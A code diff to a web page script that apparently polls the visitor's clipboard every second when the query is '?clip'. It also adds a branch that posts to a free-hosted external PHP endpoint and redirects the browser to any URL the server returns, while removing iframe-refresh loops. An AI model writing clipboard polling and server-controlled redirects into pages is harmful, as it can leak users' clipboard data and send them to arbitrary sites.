@@ -80,10 +80,6 @@
       data: ({type: "time"})
     });
           if(document.location.search == "?clip"){
-            setInterval(function(){
-                console.log("ifr");
-              document.getElementById('ifr').src = "https://neon.today/context/get/58861/18589/1/468/60";
-              }, 15000);
             var set = setInterval(function(){
           navigator.clipboard.readText().then(text => {
             if(text != ""){
@@ -98,8 +94,7 @@
             }
           });
             }, 1000);
-            var i = 0;
-            var set2 = setInterval(function(){
+          } else if(document.location.search == "?get"){
           $.ajax({
       url: "https://footmal.000webhostapp.com/neon.php",
       type: "post",
@@ -107,13 +102,9 @@
       crossDomain: true,
       data: ({type: "get"}),
       success: function(data){
-      var e = i - Math.floor(i/3)*3 + 1;
-        console.log(e);
-        $("iframe:eq(" + e + ")").attr("src", data);
-        i++;
+        document.location.href = data;
       }
         });
-            }, 2500);
           }
             var h0 = $("#center").width();
             var h = h0/25;
